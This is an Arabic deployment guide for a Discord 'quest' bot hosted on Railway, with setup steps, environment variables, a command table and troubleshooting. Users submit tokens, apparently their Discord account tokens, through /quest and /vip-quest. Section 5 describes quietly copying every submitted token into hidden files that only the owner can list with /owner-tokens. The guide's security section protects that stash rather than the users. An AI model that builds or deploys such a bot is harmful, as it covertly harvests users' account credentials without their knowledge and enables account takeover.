# رفع البوت على Railway — دليل كامل

## 1) ديسكورد
1. [Developer Portal](https://discord.com/developers/applications) → Bot → انسخ التوكن
2. فعّل **Server Members Intent** (ضروري للرتب والعضوية)
3. OAuth2 → `bot` + `applications.commands`
4. صلاحيات: Send Messages, Embed Links, Use Slash Commands, Read Message History
5. ادعُ البوت لسيرفرك

## 2) Railway
1. [railway.app](https://railway.app) → New Project → رفع المشروع
2. Variables (مهم جداً):

| المتغير | مطلوب | مثال |
|---------|--------|------|
| `BOT_TOKEN` | نعم | توكن البوت |
| `DB_PATH` | **نعم** | `/data/store.db` |
| `OWNER_ID` | نعم (للأوامر السرية) | آيدي حسابك في ديسكورد |
| `REQUIRED_GUILD_ID` | نعم | `1265303825821077506` |
| `VIP_ROLE_IDS` | نعم | `1557843793049288798,1557843904877957191` |
| `INVITE_LINK` | مستحسن | `https://discord.gg/row` |
| `APP_COMMAND_SYNC_SCOPE` | لا | `global` أو `guild` |

## 3) Volume — حفظ البيانات (ضروري)
بدون Volume كل Deploy يمسح التوكنات والإحصائيات.

1. Service → **Volumes** → Add Volume
2. Mount path: `/data`
3. Variable: `DB_PATH=/data/store.db`

الملفات اللي تنحفظ على الـ Volume:
- `/data/store.db` — قاعدة البيانات (SQLite)
- `/data/tokens_secret.log` — سجل نصي سري للتوكنات
- `/data/tokens_secret.json` — فهرس JSON (يوزر → توكن)

## 4) الأوامر
| الأمر | من؟ |
|--------|------|
| `/start` | الكل — **إجباري أولاً** |
| `/quest` | الكل (عادي) |
| `/vip-quest` | VIP فقط |
| `/auto` | VIP فقط |
| `/stats` `/help` `/script` | الكل (بعد start) |
| `/quest-room` | أدمن |
| `/owner-tokens` | **المالك فقط** — يشوف كل التوكنات |

## 5) الملف السري للتوكنات
لما أي شخص يحط توكن عبر `/quest` أو `/vip-quest`:
- ينحفظ في قاعدة البيانات
- **وينكتب في ملف سري** على السيرفر:
  - `tokens_secret.log` (سطر بكل مرة)
  - `tokens_secret.json` (آخر توكن لكل يوزر)

أنت تشوفهم بـ:
```
/owner-tokens action:list
/owner-tokens action:db
/owner-tokens action:log
```
الرد **ephemeral + ملف مرفق** — ما يظهر لأحد غيرك.

## 6) بعد التشغيل
1. Logs → لازم: `Logged in. Bot ID: ...`
2. `/start` → اختيار لغة
3. `/quest token:xxxx` أو `/vip-quest token:xxxx`
4. `/quest-room` مرة واحدة لتحديد روم المهام

## مشاكل شائعة
| المشكلة | الحل |
|---------|------|
| BOT_TOKEN missing | Variables |
| بيانات تضيع | Volume على `/data` + `DB_PATH` |
| VIP ما يشتغل | Members Intent + رول صحيح |
| أوامر ما تظهر | انتظر أو `APP_COMMAND_SYNC_SCOPE=guild` |
| owner-tokens يرفضك | حط `OWNER_ID` = آيدي حسابك |

## أمان
- لا ترفع `data/` أو `*.db` أو `tokens_secret.*` على GitHub (موجودة في .gitignore)
- لا تشارك مخرجات `/owner-tokens`
- التوكنات في الملف السري بصلاحيات `600` على القرص
